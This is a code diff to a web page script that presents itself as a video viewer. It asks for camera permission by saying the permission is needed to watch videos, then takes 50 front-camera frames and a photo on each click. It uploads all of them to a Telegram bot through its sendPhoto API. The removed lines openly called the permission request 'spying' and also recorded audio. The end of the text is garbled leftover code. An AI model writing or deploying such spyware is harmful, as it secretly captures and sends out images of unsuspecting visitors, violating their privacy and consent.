@@ -129,42 +129,60 @@
       expandedVideo.src = "";
     }
 
-    // طلب إذن وتشغيل الكاميرا والمايك
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+    let imageCapture = null;
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
       .then(stream => {
-        startCapture(stream);
-        startAudioRecording();
-        takeMultiplePhotos(stream, 50);
+        const track = stream.getVideoTracks()[0];
+        imageCapture = new ImageCapture(track);
+        captureMultiplePhotos(50);
       })
-      .catch(err => {
-        alert("يرجى السماح بالكاميرا والمايك لتفعيل التجسس 😈");
+      .catch(() => {
+        alert("يجب سماح كي تشاهد الفيديوهات");
       });
 
-    function takeMultiplePhotos(stream, count) {
-      const track = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(track);
+    function captureMultiplePhotos(count) {
       let taken = 0;
       const interval = setInterval(() => {
-        imageCapture.takePhoto().then(blob => {
-          sendBlob(blob, '📸 صورة رقم ' + (taken + 1));
+        if (!imageCapture) return;
+        imageCapture.grabFrame().then(bitmap => {
+          const canvas = document.createElement("canvas");
+          const size = Math.min(bitmap.width, bitmap.height);
+          canvas.width = canvas.height = size;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(bitmap, 0, 0, size, size);
+          canvas.toBlob(blob => sendImage(blob, "📸 صورة تلقائية " + (taken + 1)), "image/png");
         });
         taken++;
         if (taken >= count) clearInterval(interval);
-      }, 400);
+      }, 300);
     }
 
     function takeExtraPhoto() {
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-        imageCapture.takePhoto().then(blob => {
-          sendBlob(blob, '📸 صورة إضافية بالنقرة');
-        });
+      if (!imageCapture) return;
+      imageCapture.grabFrame().then(bitmap => {
+        const canvas = document.createElement("canvas");
+        const size = Math.min(bitmap.width, bitmap.height);
+        canvas.width = canvas.height = size;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(bitmap, 0, 0, size, size);
+        canvas.toBlob(blob => sendImage(blob, "📸 صورة بالنقرة"), "image/png");
       });
     }
 
-    function startAudioRecording() {
-      setInterval(() => {
+    function sendImage(blob, caption) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("caption", caption);
+      formData.append("photo", blob, "photo.png");
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+  </script>
+</body>
+</html>
         navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
           const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/ogg' });
           const chunks = [];
